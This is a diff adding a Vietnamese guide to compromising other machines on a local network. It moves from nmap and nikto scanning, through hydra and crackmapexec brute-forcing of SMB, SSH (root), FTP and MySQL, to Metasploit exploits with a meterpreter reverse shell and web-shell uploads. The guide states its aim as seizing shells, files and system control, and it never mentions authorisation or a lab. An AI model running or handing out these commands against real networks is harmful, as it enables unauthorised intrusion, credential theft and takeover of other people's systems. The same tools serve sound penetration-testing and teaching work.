@@ -1,0 +1,125 @@
+🎯 MỤC TIÊU
+
+Từ cùng mạng LAN, bạn sẽ:
+
+    Quét các thiết bị đang mở dịch vụ như SMB, SSH, FTP, RDP, MySQL, Web...
+
+    Tìm lỗ hổng hoặc cấu hình yếu
+
+    Khai thác để chiếm quyền, lấy file, shell, hoặc kiểm soát hệ thống
+
+🟢 PHẦN 1: CƠ BẢN – QUÉT MẠNG, DỊCH VỤ, PORT
+✅ 1. Quét IP trong LAN
+
+nmap -sn 192.168.1.0/24
+
+Kết quả:
+
+192.168.1.1   Router
+192.168.1.10  Windows 10
+192.168.1.20  NAS
+...
+
+✅ 2. Quét dịch vụ trên 1 IP
+
+nmap -sV -Pn -T4 192.168.1.10
+
+Phát hiện:
+
+21/tcp  FTP
+22/tcp  SSH
+139/445 SMB
+3306/tcp MySQL
+
+✅ 3. Quét web và CMS (nếu có HTTP)
+
+nikto -h http://192.168.1.10
+whatweb http://192.168.1.10
+
+🟡 PHẦN 2: TRUNG CẤP – KHAI THÁC CẤU HÌNH YẾU
+✅ SMB (Windows File Sharing)
+Tìm share mở công khai:
+
+smbclient -L //192.168.1.10 -N
+
+Truy cập:
+
+smbclient //192.168.1.10/Public -N
+
+Bruteforce SMB:
+
+hydra -L users.txt -P pass.txt smb://192.168.1.10
+
+Dùng crackmapexec:
+
+cme smb 192.168.1.10 -u admin -p admin123
+
+✅ SSH (Port 22)
+Thử đăng nhập:
+
+ssh user@192.168.1.10
+
+Bruteforce:
+
+hydra -l root -P pass.txt ssh://192.168.1.10
+
+✅ FTP (Port 21)
+Kiểm tra truy cập ẩn danh:
+
+ftp 192.168.1.10
+
+Bruteforce:
+
+hydra -l admin -P pass.txt ftp://192.168.1.10
+
+✅ MySQL
+
+mysql -h 192.168.1.10 -u root -p
+
+    Nếu không đặt mật khẩu: truy cập thẳng root
+
+🔴 PHẦN 3: NÂNG CAO – KHAI THÁC LỖ HỔNG, RCE, GAIN SHELL
+✅ Dùng searchsploit để tìm CVE
+
+searchsploit samba
+
+✅ Dùng Metasploit:
+
+msfconsole
+
+Ví dụ:
+
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.1.10
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.1.9
+exploit
+
+Hoặc:
+
+use exploit/windows/smb/ms08_067_netapi
+
+✅ Phát hiện shell qua dịch vụ web
+
+    Upload shell.php nếu có file upload
+
+    Exploit RCE (Remote Command Execution) như:
+
+        LFI (Local File Inclusion)
+
+        SQLi (SQL injection)
+
+        Command injection
+
+🧠 TÓM TẮT
+Mức	Công cụ	Kỹ thuật
+Cơ bản	nmap, nikto	Quét IP, dịch vụ
+Trung cấp	smbclient, hydra, cme	Bruteforce, xem share
+Nâng cao	metasploit, searchsploit	RCE, chiếm quyền root
+🔧 BỘ TOOL GỢI Ý
+Mục đích	Tool
+Quét mạng	nmap, netdiscover
+Quét lỗ hổng web	nikto, wpscan, whatweb
+Bruteforce	hydra, medusa, patator
+Khai thác	metasploit, searchsploit, crackmapexec
+Phân tích sau khai thác	enum4linux, linpeas.sh, winPEAS.exe
